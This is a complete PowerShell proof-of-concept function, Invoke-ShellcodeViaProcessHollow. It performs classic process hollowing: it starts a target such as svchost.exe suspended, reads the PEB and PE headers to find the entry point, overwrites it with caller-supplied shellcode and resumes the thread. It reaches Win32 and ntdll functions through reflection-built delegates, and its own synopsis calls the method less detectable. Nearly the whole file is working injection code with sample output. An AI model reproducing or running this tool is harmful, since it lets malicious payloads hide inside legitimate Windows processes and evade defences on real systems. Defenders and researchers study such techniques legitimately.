function Invoke-ShellcodeViaProcessHollow
{
<#
.SYNOPSIS
    Executes shellcode in the context of a newly created suspended process using classic process hollowing.

    This function demonstrates traditional process hollowing using the CreateProcess, GetThreadContext,
    ReadProcessMemory, WriteProcessMemory, and ResumeThread APIs.

    The payload replaces the entry point of a suspended target process (e.g., svchost.exe), allowing
    the shellcode to execute when the thread resumes. This method is less detectable, but primarily
    serves educational purposes.

    Notes:
        - I tested this POC on x64 Win11.
        - You can only create an x64 processes on an x64 host architecture.

.DESCRIPTION
    Author: Silentis Vox (@SilentisVox)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

.PARAMETER ProcessPath
    Full path to the process to hollow (e.g., C:\Windows\System32\svchost.exe)

.PARAMETER Shellcode
    Byte array containing the shellcode to inject.

.EXAMPLE
    # Create a local thread that executes shellcode.
    # x64 Win10 RS4
    PS C:\> Invoke-ShellcodeViaProcessHollow -ProcessPath "C:\Windows\System32\svchost.exe" -Shellcode $Shellcode -verbose
    VERBOSE: [+] Process Created [5816] And Is Suspended.
    VERBOSE: [+] Process Basic Information Retrieved.
    VERBOSE: [+] PEB + Image Start Address Located At 0x12EC508000.
    VERBOSE: [+] Image Base Address (DOS Header) Located At 0x7FF780100000.
    VERBOSE: [+] DOS Header Populated.
    VERBOSE: [+] PE Header Populated.
    VERBOSE: [+] Adress Of Entry Point Located At 0x7FF780104FE0.
    VERBOSE: [+] Shellcode [272] Written To 0x7FF780104FE0.
    VERBOSE: [+] Process Resumed And Is Executing.
    True
#>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$ProcessPath,

        [Parameter(Mandatory)]
        [Byte[]]$Shellcode
    )

    function Get-Delegate
    {   
        # We can grab a function address easily, but to treat it as such has it's quirks.

        # Every function is tied to the name of it's method. The method must have a
        # brothering contructor, and a parenting type. The type must have a parenting
        # module. The module must have a parenting assembly.

        # So in reverse order, we create an assembly; under the assembly is a type,
        # so we create that; under the type is the constructor, and invocation method.
        # once that is built, we can then return it use ready.

        param(
            [Parameter(Mandatory)]
            [IntPtr]$FunctionAddress,

            [Parameter(Mandatory)]
            [Type[]]$ArgumentTypes,

            [Parameter()]
            [Type]$ReturnType=[Void]
        )

        # Create an in memory assembly where the delegate will reside.

        $AssemblyNameString             = "New Assembly"
        $AssemblyName                   = [Reflection.AssemblyName]::New($AssemblyNameString)
        $AssemblyBuilderAccess          = [Reflection.Emit.AssemblyBuilderAccess]::Run
        $Domain                         = [AppDomain]::CurrentDomain

        $AssemblyBuilder                = $Domain.DefineDynamicAssembly($AssemblyName, $AssemblyBuilderAccess)

        # Define the single module.

        $ModuleNameString               = "New Module"
        $EmitDebug                      = $false

        $ModuleBuilder                  = $AssemblyBuilder.DefineDynamicModule($ModuleNameString, $EmitDebug)

        # Define the single type.

        $TypeNameString                 = "New Type"
        $TypeAttributes                 = "Class, Public, Sealed, AnsiClass, AutoClass"
        $DelegateBaseType               = [MulticastDelegate]

        $TypeBuilder                    = $ModuleBuilder.DefineType($TypeNameString, $TypeAttributes, $DelegateBaseType)

        # Define the contructor needed.

        $ConstructorAttributes          = "RTSpecialName, HideBySig, Public"
        $ConstructorCallingConvention   = [Reflection.CallingConventions]::Standard
        $ImplementationFlags            = "Runtime, Managed"

        $ConstructorBuilder             = $TypeBuilder.DefineConstructor($ConstructorAttributes, $ConstructorCallingConvention, $ArgumentTypes)
        $ConstructorBuilder.SetImplementationFlags($ImplementationFlags)

        # Define the invocation method.

        $MethodNameString               = "Invoke"
        $MethodAttributes               = "Public, HideBySig, NewSlot, Virtual"

        $MethodBuilder                  = $TypeBuilder.DefineMethod($MethodNameString, $MethodAttributes, $ReturnType, $ArgumentTypes)
        $MethodBuilder.SetImplementationFlags($ImplementationFlags)

        # Create the delegate.

        $Delegate                       = $TypeBuilder.CreateType()
        $DelegateInstance               = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FunctionAddress, $Delegate)

        return $DelegateInstance
    }

    # System.dll contains all of our unconventional types.

    $Assemblies                         = [AppDomain]::CurrentDomain.GetAssemblies()
    $SystemAssembly                     = $null

    foreach ($Assembly in $Assemblies)
    {
        if ($Assembly.GlobalAssemblyCache -and $Assembly.Location.Split("\\")[-1] -eq "System.dll")
        {
            $SystemAssembly             = $Assembly
            break
        }
    }

    $UnsafeMethodsType                  = $SystemAssembly.GetType("Microsoft.Win32.UnsafeNativeMethods")
    $NativeMethodsType                  = $SystemAssembly.GetType("Microsoft.Win32.NativeMethods")
    $StartupInformationType             = $SystemAssembly.GetType("Microsoft.Win32.NativeMethods+STARTUPINFO")
    $ProcessInformationType             = $SystemAssembly.GetType("Microsoft.Win32.SafeNativeMethods+PROCESS_INFORMATION")

    # Get the methods needed to grab functions within the dlls.

    $GetModuleHandle                    = $UnsafeMethodsType.GetMethod("GetModuleHandle")
    $GetProcAddress                     = $UnsafeMethodsType.GetMethod("GetProcAddress", [Reflection.BindingFlags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @([IntPtr], [String]), $null);
    $CreateProcess                      = $NativeMethodsType.GetMethod("CreateProcess")

    # Get all of our address pointers to our needed functions.

    $Kernel32Handle                     = $GetModuleHandle.Invoke($null, @([String] "kernel32.dll"))
    $NtdllHandle                        = $GetModuleHandle.Invoke($null, @([String] "ntdll.dll"))

    $ZwQueryInformationProcessAddress   = $GetProcAddress.Invoke($null, @($NtdllHandle,    "ZwQueryInformationProcess"))
    $ReadProcessMemoryAddress           = $GetProcAddress.Invoke($null, @($Kernel32Handle, "ReadProcessMemory"))
    $WriteProcessMemoryAddress          = $GetProcAddress.Invoke($null, @($Kernel32Handle, "WriteProcessMemory"))
    $ResumeThreadAddress                = $GetProcAddress.Invoke($null, @($Kernel32Handle, "ResumeThread"))

    # Create delegates with our function pointers.

    $ZwQueryInformationProcess          = Get-Delegate $ZwQueryInformationProcessAddress @([IntPtr], [Int], [Byte[]], [UInt32], [UInt32]) ([Int])
    $ReadProcessMemory                  = Get-Delegate $ReadProcessMemoryAddress @([IntPtr], [IntPtr], [Byte[]], [Int], [IntPtr]) ([Bool])
    $WriteProcessMemory                 = Get-Delegate $WriteProcessMemoryAddress @([IntPtr], [IntPtr], [Byte[]], [Int32], [IntPtr]) ([Bool])
    $ResumeThread                       = Get-Delegate $ResumeThreadAddress @([IntPtr]) ([Int])

    # Initialize neededed variables and structures.

    $StartupInformation                 = $StartupInformationType.GetConstructors().Invoke($null)
    $ProcessInformation                 = $ProcessInformationType.GetConstructors().Invoke($null)

    $ImageBaseAddressBuffer             = [Byte[]]::New(8)
    $DOSHeaderBuffer                    = [Byte[]]::New(64)
    $PEHeaderBuffer                     = [Byte[]]::New(128)

    $BytesRead                          = 0
    $BytesWritten                       = 0

    $ProcessToHollow                    = [Text.StringBuilder]::New($ProcessPath)

    $Result                             = $CreateProcess.Invoke($null, @($null, $ProcessToHollow, $null, $null, $False, 0x4, $null, $null, $StartupInformation, $ProcessInformation))
    
    if ($Result)
    {
        $ProcessId                      = $ProcessInformation.dwProcessId
        Write-Verbose "[+] Process Created [$ProcessId] And Is Suspended."
    }
    else
    {
        $FunctionError                  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Verbose "[!] CreateProcess Failed: $FunctionError"
        $false
        return
    }

    # The start address of the image is held in
    # process information. Also the thread context
    # is held in the thread handle. We can use the
    # query process information function to find
    # the start image address of our process.

    $ThreadHandle                       = $ProcessInformation.hThread
    $ProcessHandle                      = $ProcessInformation.hProcess

    $ProcessBasicInformation            = [Byte[]]::New(48)

    $Result                             = $ZwQueryInformationProcess.Invoke($ProcessHandle, 0, $ProcessBasicInformation, $ProcessBasicInformation.Length, 0)
 
    if (-not $Result)
    {
        Write-Verbose "[+] Process Basic Information Retrieved."
    }
    else
    {
        $FunctionError                  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Verbose "[!] ZwQueryInformationProcess Failed: $FunctionError"
        $false
        return
    }

    # In PROCESS_BASIC_INORMATION, we have a PEB field at the 8th byte.
    # We know the relative to the PEB pointer, the Image Base Address field
    # within the PEB is at the 16th byte. We now have a pointer to the
    # image address. Querying here will give us the start of the Image Base
    # Address, then read the following 8 bytes to get the full address.

    $PEBOffset                          = 8
    $PEBAddress                         = [BitConverter]::ToUInt64($ProcessBasicInformation, $PEBOffset)

    Write-Verbose ("[+] PEB + Image Start Address Located At 0x{0:X}." -f $PEBAddress)

    $PEBImageBaseAddressOffset          = 16
    $PEBImageBaseAddress                = $PEBAddress + $PEBImageBaseAddressOffset
    $PEBImageBasePointer                = [IntPtr]::New($PEBImageBaseAddress)

    # Prepare a buffer and read the process memory
    # to receive the DOS header.

    $Result                             =  $ReadProcessMemory.Invoke($ProcessHandle, $PEBImageBasePointer, $ImageBaseAddressBuffer, $ImageBaseAddressBuffer.Length, $BytesRead)
    
    $ImageBaseAddress                   = [BitConverter]::ToUInt64($ImageBaseAddressBuffer, 0)
    $ImageBasePointer                   = [IntPtr]::New($ImageBaseAddress)

    if ($Result)
    {
        Write-Verbose ("[+] Image Base Address (DOS Header) Located At 0x{0:X}." -f $ImageBaseAddress)
    }
    else
    {
        $FunctionError                  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Verbose "[!] ReadProcessMemory Failed: $FunctionError"
        $false
        return
    }

    # Read the process memory to receive the PE
    # header, then calculate the address of entry.

    $Result                             =  $ReadProcessMemory.Invoke($ProcessHandle, $ImageBasePointer, $DOSHeaderBuffer, $DOSHeaderBuffer.Length, $BytesRead)

    if ($Result)
    {
        Write-Verbose "[+] DOS Header Populated."
    }
    else
    {
        $FunctionError                  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Verbose "[!] ReadProcessMemory Failed: $FunctionError"
        $false
        return
    }

    $e_lfanewOffset                     = 60
    $e_lfanewAddressRelative            = [BitConverter]::ToUInt32($DOSHeaderBuffer, $e_lfanewOffset)
    $e_lfanewAddress                    = $ImageBaseAddress + [UInt64] $e_lfanewAddressRelative
    $e_lfanewPointer                    = [IntPtr]::New($e_lfanewAddress)

    $Result                             = $ReadProcessMemory.Invoke($ProcessHandle, $e_lfanewPointer, $PEHeaderBuffer, $PEHeaderBuffer.Length, $BytesRead)
    
    if ($Result)
    {
        Write-Verbose "[+] PE Header Populated."
    }
    else
    {
        $FunctionError                  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Verbose "[!] ReadProcessMemory Failed: $FunctionError"
        $false
        return
    }

    $EntryPointAddressOffset            = 40
    $EntryPointAddressRelative          = [BitConverter]::ToUInt32($PEHeaderBuffer, $EntryPointAddressOffset)
    $EntryPointAddress                  = $ImageBaseAddress + [UInt64] $EntryPointAddressRelative
    $EntryPointPointer                  = [IntPtr]::New($EntryPointAddress)

    Write-Verbose ("[+] Adress Of Entry Point Located At 0x{0:X}." -f $EntryPointAddress)

    # Write our shellcode to the address of entry.

    $ShellcodeSize                      = $Shellcode.Length

    $Result                             = $WriteProcessMemory.Invoke($ProcessHandle, $EntryPointPointer, $Shellcode, $ShellcodeSize, $BytesWritten)

    if ($Result)
    {
        Write-Verbose ("[+] Shellcode [$ShellcodeSize] Written To 0x{0:X}." -f $EntryPointAddress)
    }
    else
    {
        $FunctionError                  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Verbose "[!] WriteProcessMemory Failed: $FunctionError"
        $false
        return
    }

    # Resume the thread.

    $Result                             = $ResumeThread.Invoke($ThreadHandle)

    if ($Result)
    {
        Write-Verbose "[+] Process Resumed And Is Executing."
    }
    else
    {
        $FunctionError                  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Verbose "[!] ResumeThread Failed: $FunctionError"
        $false
        return
    }

    return $true
}
